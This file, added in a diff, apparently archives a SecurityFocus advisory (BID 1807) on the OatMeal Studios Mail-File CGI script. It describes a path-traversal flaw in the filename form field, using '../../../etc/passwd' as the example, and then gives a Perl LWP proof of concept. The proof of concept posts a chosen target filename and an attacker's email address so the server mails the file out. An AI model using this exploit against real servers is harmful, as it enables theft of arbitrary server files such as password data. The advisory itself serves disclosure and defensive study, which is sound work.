@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/1807/info
+
+OatMeal studios' Mail-File is a cgi application that allows for sending of certain files to user-specified email addresses via a web interface. A vulnerability exists in this script that can be used to send the contents of <i>any</i> readable user-specified files to an email address. When used normally, the web interface provides the user with the option to select files to send that have been pre-configured in the script. The values of the form variables associated with each "pre-configured file" are the actual filenames that are used when opening the files. As a result, the user can manipulate the filename value so that the script will, instead of opening one of the "normal" options, open whatever has been specified as the filename (eg "../../../../../../../../../etc/passwd"). The script also checks the value of the referrer when accepting submitted input from the form but fails to protect against this attack. If exploited, an attacker can read arbitrary files on the filesystem with the privileges of the webserver. This may lead to further compromise.
+
+#!/usr/bin/perl
+
+use HTTP::Request::Common;
+use LWP::UserAgent;
+
+$ua = LWP::UserAgent->new;
+$res = $ua->request(POST 'http://domain/mailfile.cgi',
+[real_name => 'value1',
+email => 'value2',
+filename => 'value3',
+]);
+
+--snip--
+
+value3 = target filename
+value2 = where to send the file to
+value1 = username.. can be anything.
